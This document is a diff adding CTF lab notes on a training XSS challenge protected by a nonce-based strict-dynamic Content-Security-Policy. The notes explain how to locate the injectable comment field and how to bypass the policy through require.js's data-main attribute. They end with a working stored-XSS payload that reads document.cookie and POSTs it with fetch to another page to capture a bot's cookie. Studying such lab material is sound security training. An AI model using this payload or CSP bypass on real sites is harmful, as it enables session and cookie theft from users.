@@ -1,0 +1,24 @@
+The first part is the same of the previous challenge:
+	First of all, try all the inputs: <script>alert(1)</script> to see which input section is vulnerable (quick way)
+	you need to change the number for each inputs (in alert)
+	Notice that in the first page, they are interpreted as text so no xss here.
+	In the second page (pool something), a comment is not printed. If it is not printed, probably it's code. Inspect the element to be sure
+	If you don't know if the challenge is csp: usually, if you need to steal the cookies, it's xss
+	In this challenge there is a bot that will open the page that you sent. If there are scripts, they will be executed(xss included)
+	The trick is to make the bot goes there and we will check with a proxy all the get requests and in one of them there will be the flag
+	Content-Security-Policy allows you to use javascript only if it comes from the specified links
+	you can check it with inspect element -> network -> f5 -> header(intestazione)
+	there you will find the Content-Security-Policy and 
+	(notice that CSP blocks the previous alert, that's why you cannot use directly xss)
+The difference with the previous one is the Content-Security-Policy which is (for the script):
+	script-src 'strict-dynamic' 'nonce-e9T1XZ3iyo'
+here, you can find an explanation of nonce:
+	https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce
+
+the idea is to exploit the only avaiable javascript in the page: require.js. 
+Again we can use the same vulnerability which stored-based on the page pool.
+We want to send a post request to another page (we have two equal pages of the challenges opened) and retrieve the flag on body of the comment.
+Notice that Formdata is specified in the html as the "post" request. Same thing also for the field "name" and "comment".
+The link in the script is the link of the receiving page.
+While the link of the sending page is copy-pasted in the checker (web-site with a bot). 
+	<script data-main='data:1,var form = new FormData(); form.append("name","flag"); form.append("comment",document.cookie);fetch("https://strict-csp.training.jinblack.it/poll/2cee89a5a5d14966af351381d78d4edb",{method:"POST",body: form});' src='require.js'></script>
